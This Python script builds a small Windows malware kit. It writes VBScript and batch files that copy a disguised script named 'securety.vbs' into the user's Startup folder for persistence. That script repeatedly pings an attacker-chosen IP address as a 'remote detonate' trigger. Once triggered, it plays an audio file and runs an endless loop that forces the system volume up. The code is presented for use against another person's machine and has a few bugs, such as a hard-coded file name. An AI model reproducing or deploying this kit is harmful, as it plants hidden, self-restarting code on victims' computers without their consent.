
import argparse
import os

def greeting(args):
    if args.wav_filename and args.deploy_folder and args.ip:
        print("getting ready.")
        load(args.deploy_folder+args.wav_filename,args.deploy_folder)
        sound(args.deploy_folder)
        pack(args.deploy_folder)
        startup_kit(args.deploy_folder, args.ip)
        print("move the audio file to your destination folder")
    else:
        print('error')






def load(filename,path):
    
    f = open(path+"sys.vbs", "w")
    f.write("Dim oPlayer\n")
    f.write('Set oPlayer = CreateObject("WMPlayer.OCX")\n')
    f.write('Set WSHELL = CreateObject("Wscript.Shell")\n')
    f.write('WSHELL.Run("failsafe.vbs")\n')
  

    ###filename error
    f.write('oPlayer.URL = "%APPDATA%\Microsoft\Windows/Start Menu/Programs/test.wav"\n')
    f.write("oPlayer.controls.play \n")
    f.write("While oPlayer.playState <> 1 ' 1 = Stopped\n")
    f.write("  WScript.Sleep 10\n")
    f.write("Wend\n")


    f.write("oPlayer.close\n")
    f.close()
    print("player loaded!")



def sound(path):
    f = open(path+"failsafe.vbs", "w")
    f.write('x=1\n')
    f.write('Do While x<>100\n')


    f.write('Set WshShell = CreateObject("WScript.Shell")\n')
    f.write('WshShell.SendKeys(chr(&hAF))\n')
    f.write('x=x\n')
    f.write('Loop')
    f.close()
    print("sound loaded!")
    
def pack(path):
    f = open(path+"start.bat", "w")
    f.write('move %~dp0securety.vbs "%APPDATA%\Microsoft\Windows/Start Menu/Programs/Startup/"\n')
    f.write('move "%~dp0." "%APPDATA%\Microsoft\Windows/Start Menu/Programs/"\n')
    f.close()
    print("sound loaded!")


def startup_kit(path,ip):
    f = open(path+"securety.vbs", "w")
    f.write('Set WSHELL = CreateObject("Wscript.Shell")\n')
    f.write('Do While x<>100\n')

    f.write('Dim hostname\n')
    f.write('hostname = "'+ip+'"\n')
    
    f.write('Set WshShell = WScript.CreateObject("WScript.Shell")\n')
    
    f.write('Ping = WshShell.Run("ping -n 1 " & hostname, 0, True)\n')
    f.write('Select Case Ping\n')
    f.write('Case 0 \n')
    f.write('WSHELL.Run("%APPDATA%\Microsoft\Windows\Start Menu\Programs\sys.vbs")\n')
    f.write('WScript.Sleep 10000\n')
    f.write('Case 1 \n')
   
    
    f.write('End Select\n')
    f.write('WScript.Sleep 1000\n')
    f.write('Loop\n')
    f.close()
    print("connector charched!")



if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='loader')

    parser.add_argument('--wav_filename', type=str, help='just the name without .wav')
    parser.add_argument('--deploy_folder', type=str, help='folder path')
    parser.add_argument('--ip', type=str, help='remote detonate on successfull ping')

    greeting(parser.parse_args())